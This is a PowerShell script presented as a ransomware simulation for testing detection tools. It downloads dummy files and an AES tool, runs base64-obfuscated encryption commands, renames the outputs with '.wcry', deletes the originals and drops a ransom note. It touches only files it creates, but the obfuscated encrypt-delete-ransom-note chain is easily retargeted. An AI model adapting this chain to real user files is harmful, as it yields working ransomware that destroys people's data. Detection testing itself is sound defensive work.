#This script serves to test response/detection of various tools to a simulated ransomware attack. It only encrypts files that it creates and does not encrypt client/personal data#
#This script is provided as is with no warranty or guarentees of any kind. Use at your own risk#
#Author: Infinitybiff@gmail.com#
#Defines 4 files location and destination we'll push to C:\Users\Public\Documents and later encrypt#
$dummyfilesauce1 = "https://#define you own webserver here#/prs-doc1.docx"
$dummyfilesauce2 = "https://#define you own webserver here#/prs-doc2.pdf"
$dummyfilesauce3 = "https://#define you own webserver here#/prs-doc3.xlsx"
$dummyfilesauce4 = "https://#define you own webserver here#/prs-doc4.pptx"
$dummyfiledest1 = "C:\Users\Public\Documents\prs-doc1.docx"
$dummyfiledest2 = "C:\Users\Public\Documents\prs-doc2.pdf"
$dummyfiledest3 = "C:\Users\Public\Documents\prs-doc3.xlxs"
$dummyfiledest4 = "C:\Users\Public\Documents\prs-doc4.pptx"
#defines ransom note source/destination#
$ransomnotesauce = "https://#define you own webserver here#README.txt"
$ransomnotedest = "C:\Users\Public\Documents\README.txt"
#Define AEScrypt cli exe location#
$cryptsauce = "https://#define you own webserver here#aescrypt.exe"
$cryptdest = "C:\Users\Public\Documents\aescrypt.exe"
#Download the files#
Invoke-WebRequest -Uri $dummyfilesauce1 -OutFile $dummyfiledest1
Invoke-WebRequest -Uri $dummyfilesauce2 -OutFile $dummyfiledest2
Invoke-WebRequest -Uri $dummyfilesauce3 -OutFile $dummyfiledest3
Invoke-WebRequest -Uri $dummyfilesauce4 -OutFile $dummyfiledest4
Invoke-WebRequest -Uri $cryptsauce -OutFile $cryptdest
#wait 10 seconds#
Start-Sleep -Seconds 10
#encode encryption password base64#
#encryption password is "zerocool!"#
$cryptpassencode = "emVyb2Nvb2wh"
#decode encryption passwword as var#
$cryptpassdecode = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptpassencode))
#encode naughty expressions base64#
#expressions are as follows#
#C:\Users\Public\Documents\aescrypt.exe -e -p $cryptpassdecode C:\users\public\documents\prs-doc1.docx#
#C:\Users\Public\Documents\aescrypt.exe -e -p $cryptpassdecode C:\users\public\documents\prs-doc2.pdf#
#C:\Users\Public\Documents\aescrypt.exe -e -p $cryptpassdecode C:\Users\Public\Documents\prs-doc3.xlxs#
#C:\Users\Public\Documents\aescrypt.exe -e -p $cryptpassdecode C:\Users\Public\Documents\prs-doc4.pptx#
$cryptrunnerenc1 = "QzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xhZXNjcnlwdC5leGUgLWUgLXAgJGNyeXB0cGFzc2RlY29kZSBDOlx1c2Vyc1xwdWJsaWNcZG9jdW1lbnRzXHBycy1kb2MxLmRvY3g="
$cryptrunnerenc2 = "QzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xhZXNjcnlwdC5leGUgLWUgLXAgJGNyeXB0cGFzc2RlY29kZSBDOlx1c2Vyc1xwdWJsaWNcZG9jdW1lbnRzXHBycy1kb2MyLnBkZg=="
$cryptrunnerenc3 = "QzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xhZXNjcnlwdC5leGUgLWUgLXAgJGNyeXB0cGFzc2RlY29kZSBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXHBycy1kb2MzLnhseHM="
$cryptrunnerenc4 = "QzpcVXNlcnNcUHVibGljXERvY3VtZW50c1xhZXNjcnlwdC5leGUgLWUgLXAgJGNyeXB0cGFzc2RlY29kZSBDOlxVc2Vyc1xQdWJsaWNcRG9jdW1lbnRzXHBycy1kb2M0LnBwdHg="
#decode naughty expressions as var#
$cryptrunnerdec1 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptrunnerenc1))
$cryptrunnerdec2 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptrunnerenc2))
$cryptrunnerdec3 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptrunnerenc3))
$cryptrunnerdec4 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($cryptrunnerenc4))
#ready.fire.aim#
#sleep between each of the encrypt/rename/del commands to give extra time for detection#
Invoke-Expression -Command "$cryptrunnerdec1"
Start-Sleep -Seconds 30
Invoke-Expression -Command "$cryptrunnerdec2"
Start-Sleep -Seconds 30
Invoke-Expression -Command "$cryptrunnerdec3"
Start-Sleep -Seconds 30
Invoke-Expression -Command "$cryptrunnerdec4"
#define encrypted files for renaming#
$c1 = "C:\Users\Public\Documents\prs-doc1.docx.aes"
$c2 = "C:\Users\Public\Documents\prs-doc2.pdf.aes"
$c3 = "C:\Users\Public\Documents\prs-doc3.xlxs.aes"
$c4 = "C:\Users\Public\Documents\prs-doc4.pptx.aes"
#define new names#
$d1 = "C:\Users\Public\Documents\prs-doc1.docx.wcry"
$d2 = "C:\Users\Public\Documents\prs-doc2.pdf.wcry"
$d3 = "C:\Users\Public\Documents\prs-doc3.xlxs.wcry"
$d4 = "C:\Users\Public\Documents\prs-doc4.pptx.wcry"
#rename encrypted files to increase detection chances#
Rename-Item $c1 $d1
Start-Sleep -Seconds 30
Rename-Item $c2 $d2
Start-Sleep -Seconds 30
Rename-Item $c3 $d3
Start-Sleep -Seconds 30
Rename-Item $c4 $d4
Start-Sleep -Seconds 30
#delete unencrypted files#
Remove-Item "$dummyfiledest1"
Start-Sleep -Seconds 30
Remove-Item "$dummyfiledest2"
Start-Sleep -Seconds 30
Remove-Item "$dummyfiledest3"
Start-Sleep -Seconds 30
Remove-Item "$dummyfiledest4"
Start-Sleep -Seconds 30
#drop note#
Invoke-WebRequest -Uri $ransomnotesauce -OutFile $ransomnotedest
Start-Sleep -Seconds 30
#delete aescrypt#
Remove-Item "$cryptdest"
